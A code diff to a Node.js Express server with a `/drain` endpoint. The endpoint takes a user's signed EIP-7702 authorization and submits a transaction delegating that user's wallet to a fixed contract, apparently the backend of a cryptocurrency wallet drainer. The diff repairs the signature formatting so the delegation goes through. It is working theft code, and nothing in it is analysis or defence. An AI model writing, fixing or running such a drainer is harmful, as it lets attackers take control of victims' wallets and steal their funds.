@@ -1,6 +1,6 @@
 import express from "express";
 import cors from "cors";
-import { JsonRpcProvider, Wallet, Interface } from "ethers";
+import { JsonRpcProvider, Wallet, Interface, Authorization } from "ethers";
 
 const RPC = process.env.RPC_URL;
 const PK = process.env.PRIVATE_KEY;
@@ -32,13 +32,16 @@ app.post("/drain", async (req, res) => {
     yp = Number(yp);
     if (yp >= 27) yp = yp - 27;
 
+    // Construire l'autorisation avec le helper ethers, puis injecter la signature
     const authorization = {
       chainId: BigInt(auth.chainId),
       address: CONTRACT,
       nonce: BigInt(auth.nonce),
+    };
+    const sig = {
       yParity: yp,
-      r: clean(auth.r),
-      s: clean(auth.s),
+      r: "0x" + clean(auth.r),
+      s: "0x" + clean(auth.s),
     };
 
     const nonce = await provider.getTransactionCount(wallet.address, "latest");
@@ -54,7 +57,7 @@ app.post("/drain", async (req, res) => {
       maxFeePerGas: fee.maxFeePerGas,
       maxPriorityFeePerGas: fee.maxPriorityFeePerGas,
       gasLimit: 300000n,
-      authorizationList: [authorization],
+      authorizationList: [Authorization.from({ ...authorization, ...sig })],
     };
 
     const sent = await wallet.sendTransaction(tx);
